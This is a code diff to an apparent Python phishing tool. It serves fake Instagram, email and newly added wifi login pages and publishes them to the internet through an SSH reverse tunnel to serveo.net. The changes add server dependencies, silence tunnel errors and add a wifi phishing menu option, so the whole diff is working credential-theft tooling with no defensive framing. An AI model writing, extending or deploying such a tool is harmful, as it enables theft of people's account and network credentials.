@@ -8,7 +8,7 @@ import itertools
 import time
 from datetime import datetime
 
-# -------- Auto-install Flask --------
+# -------- Auto-install dependencies --------
 def install(package):
     os.system(f"{sys.executable} -m pip install {package}")
 
@@ -18,6 +18,13 @@ except ModuleNotFoundError:
     print("Installing Flask...")
     install("flask")
     from flask import Flask, request, send_from_directory
+
+try:
+    import waitress
+except ModuleNotFoundError:
+    print("Installing Waitress...")
+    install("waitress")
+    import waitress
 
 # Install openssh if missing
 if os.system("command -v ssh > /dev/null") != 0:
@@ -50,9 +57,8 @@ def banner():
 """)
 
 # -------- Flask App --------
-from flask import Flask, request, send_from_directory
 app = Flask(__name__)
-selected_html = "1.html"  # default HTML file
+selected_html = "1.html"  # default
 
 @app.route('/')
 def home():
@@ -76,7 +82,7 @@ def login():
 """)
     return "Something went wrong again later :("
 
-# -------- Find free port --------
+# -------- Free Port Finder --------
 def get_free_port(start_port=8080):
     port = start_port
     while True:
@@ -104,27 +110,34 @@ def run_server():
     print(f"║ {cyan}Starting server...{reset}")
     print(f"{pink}╚══════════════════════╝{reset}\n")
 
-    # Start Serveo tunnel in background
     ssh_cmd = f"ssh -o StrictHostKeyChecking=no -R 80:localhost:{port} serveo.net"
-    process = subprocess.Popen(ssh_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+    process = subprocess.Popen(
+        ssh_cmd,
+        shell=True,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.DEVNULL,
+        text=True
+    )
 
-    # Print tunnel URL nicely
+    public_url = None
     for line in process.stdout:
         if "Forwarding HTTP" in line:
             public_url = line.strip().split()[-1]
-            print(f"""{grn}
-╔══════════════════════╗
-║ {cyan}Public Link:\n {ylo} {public_url}{reset}
-╚══════════════════════╝
-""")
-
-            # Start spinner animation
-            threading.Thread(target=spinner, daemon=True).start()
             break
 
-    # Run Flask (blocking)
-    app.run(host="127.0.0.1", port=port, debug=False)
+    if public_url:
+        print(f"""{grn}
+╔════════════════════════════════════════╗
+║ {cyan}Public Link → {ylo}{public_url}{reset}
+╚════════════════════════════════════════╝
+""")
 
+        # Start spinner
+        threading.Thread(target=spinner, daemon=True).start()
+
+    waitress.serve(app, host="127.0.0.1", port=port)
+
+# -------- Main --------
 if __name__ == "__main__":
     banner()
 
@@ -135,9 +148,19 @@ if __name__ == "__main__":
 ╠══════════════════════╣
 ║ [1] instagram
 ║ [2] email
+║ [3] wifi
 ╚══════════════════════╝
 {reset}""")
-    choice = input(f"{ylo}Enter your choice (1/2): {reset}").strip()
-    selected_html = "11.html" if choice == "1" else "2.html"
+    choice = input(f"{ylo}Enter your choice (1/2/3): {reset}").strip()
+
+    if choice == "1":
+        selected_html = "11.html"
+    elif choice == "2":
+        selected_html = "2.html"
+    elif choice == "3":
+        selected_html = "wifi.html"
+    else:
+        print(f"{red}Invalid choice, using default (instagram).{reset}")
+        selected_html = "11.html"
 
     run_server()
